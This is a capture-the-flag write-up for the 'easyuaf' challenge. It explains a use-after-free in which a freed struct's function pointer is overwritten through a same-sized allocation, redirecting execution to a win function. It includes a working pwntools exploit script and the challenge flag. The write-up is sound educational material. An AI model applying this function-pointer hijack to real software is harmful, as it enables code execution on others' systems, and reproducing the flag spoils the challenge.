# easyuaf
Other than OOB access, use-after-free is another very nice bug to exploit. Usually UAF can be used to do OOB access too.

MD5 (easyuaf.zip) = 95a6dc83bec963416d01f2cf34eeb30a

Author: daniellimws

`nc challs.nusgreyhats.org 10525`

```sh
$ tree easyuaf
easyuaf
├── easyuaf
└── easyuaf.c
$ checksec easyuaf/easyuaf
[*] 'easyuaf/easyuaf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     # X
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000) # X
```

# Reading the code
`easyuaf.cpp` is a little bit long, at 250+ lines. Instead of going through the thing, line-by-line, I'll try to show what the intuitions of a quick solver might look like.

Every heap problem begins with a simple question:

## What's on the heap?
`malloc` only appears in two (uncommented) places:
```c
    person *res = (person*) malloc(sizeof(person)); // in new_person()
    org *res = (org*) malloc(sizeof(org)); // in new_org()
```
This tells us that the heap will contain instances of `person`/`org` only (assuming no side effects from libc function calls). What do those structures look like?
```c
// to display sizeof(), see https://stackoverflow.com/a/35261673
typedef struct person {
    char name[24];
    int id;
    int age;
    int personal_num;
    int business_num;
} person; // sizeof(person) == 0x28
typedef struct org {
    char name[24];
    int id;
 // int _pad; // gcc inserts 4 bytes of padding here
    void (*display)(struct org*, struct person*);
} org;    // sizeof(org)    == 0x28
```
There are two important things to notice, here:
1. The `org` type has a **function pointer**, `display`. These variables are usually very good targets for obtaining RCE.
2. the `person` and `org` are sized identically in memory. This is noteworthy, because it means that `free`d instances of `org` can be reused for memory allocations for `person`s. Consider:
    ```c
    org *o = malloc(sizeof(org));
    free(o);
    person *p = malloc(sizeof(person))
    ```
    Most of the time, `o == p`, because [`malloc` likes to reuse recently-freed memory for new allocations.](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)

So, without knowing ANYTHING else about the problem, you might think:

> The problem is titled "easyuaf".   
> "uaf" refers to "Use After Free".
>
> If I free an `org *o` pointer, and   
> I create a new `person *p`, where `o == p`,   
> `o->display` will share the same memory space with `p->personal_num`, `p->business_num`.
>
> Assuming I can run `o->display()` after `free(o)` (aka **Using `o` After Free**), and   
> assuming I have control over `p->personal_num`, `p->business_num`,   
> I might be able to change RIP arbitrarily!

As it turns out, you can. Let me explain.

## Why is there a UAF?
In a trivial sense, you can show that `org`s can be Used After Free, because you can use them in the CLI after deletion:
```
> 3
ID (0-127): 0
Deleted org 0.
> 4
Org ID (0-127): 0
Person ID (0-127): 0
-------------------------------------
*** Org:            0 ***
--- Name: person
--- ID:   0
--- Age:  18
--- Personal Contact:  999
--- Business Contact:  999
-------------------------------------
```
To explain why this happens, we should look for what happens during `free`s. If you search `easyuaf.cpp` for `free`, you will find only 1 occurance of it:
```c
void delete_org() {
    // ... if { ... }
    else {
        free(orgs[id]);
        printf("Deleted org %d.\n", id);
    }
}
```
What's wrong with this? Consult this wall of text:

![](https://azeria-labs.com/wp-content/uploads/2019/03/heap-rules-CS.png)

> Do not read or write to a pointer returned by malloc after that pointer has been passed back to free.
> --> Can lead to use after free vulnerabilities.

Is that what's happening here? Not immediately. The problem with the code above is that `orgs[id]` is [not overwritten with `NULL`](https://en.wikipedia.org/wiki/Dangling_pointer). The pointer assigned to `orgs[id]` from `malloc()` in `new_org()` --
```c
void new_org() {
    org *res = (org*) malloc(sizeof(org));
    // ...
    orgs[res->id] = res;
}
```
-- remains in `orgs[id]`, even after `delete_org()` returns. This becomes a UAF when the program makes use of `orgs[id]` _after_ calling `free()`, as might happen in a call to `print_card()`:
```c
void print_card()
{
    int org_id;
    // ...
    org *o = orgs[org_id];
    person *p = persons[person_id];
    o->display(o, p);
}
```
And so, the setup here is almost exactly as we imagined it to be. We can call `free(o)`, and we can call `o->display()` after doing that free. Remember, our plan was something like:
1. `free` an `org`, `o`
2. `malloc` a `person`, `p`
3. edit `p->personal_num`, `p->business_num` such that `o->display` points to `ezflag`
4. call `o->display()`

I've shown that you can do (1) and (4), but can we do (2/3)?

## Solving
The answer is 'yes', of course. Very simply, actually, because the `new_person` function does exactly just that:
```c
void new_person() {
    person *res = (person*) malloc(sizeof(person)); // this is (2)
    // ...
    printf("Personal Contact Number: ");
    res->personal_num = readint(); // this is (3)

    printf("Business Contact Number: ");
    res->business_num = readint(); // this is also (3)

    persons[res->id] = res;
}
```
So, the full solution is looking something like this:
1. make an `org`
2. delete that `org`
3. make a `person`, such that `p->personal_num == ezflag`
4. call `print_card()`

Does that work?
```sh
$ objdump -D easyuaf | grep ezflag
0000000000401276 <ezflag>:
$ python -c 'print 0x401276'
4199030
$ ./easyuaf
NameCard Printing Service v0.1
---------------------
1. New person
2. New org
3. Delete org
4. Print name card
5. Exit
---------------------
> 2
ID (0-127): 0
Name (max 23 chars): org
Style (1-3): 1
> 3
ID (0-127): 0
Deleted org 0.
> 1
ID (0-127): 0
Name (max 23 chars): person
Age: 0
Personal Contact Number: 4199030
Business Contact Number: 0
> 4
Org ID (0-127): 0
Person ID (0-127): 0
cat: ./flag.txt: No such file or directory
>
```
Yep. Who could've guessed?

## Short solve script
```python
from pwn import *
from typing import Union
context.binary = './easyuaf'
r = remote('challs.nusgreyhats.org', 10525)

def cmd(opt: int, *args: Union[int,bytes]):
    r.sendlineafter('> ', str(opt))
    for arg in args:
        if isinstance(arg, int): arg = b'%d' % arg
        r.sendlineafter(': ', arg)

cmd(2,0, b'org', 1)
cmd(3,0)
cmd(1,0, b'person', 0, context.binary.symbols['ezflag'], 0)
cmd(4,0,0)
print(r.recvuntil(b'}'))
```

## flag
`grey{u_are_feeling_good?}`
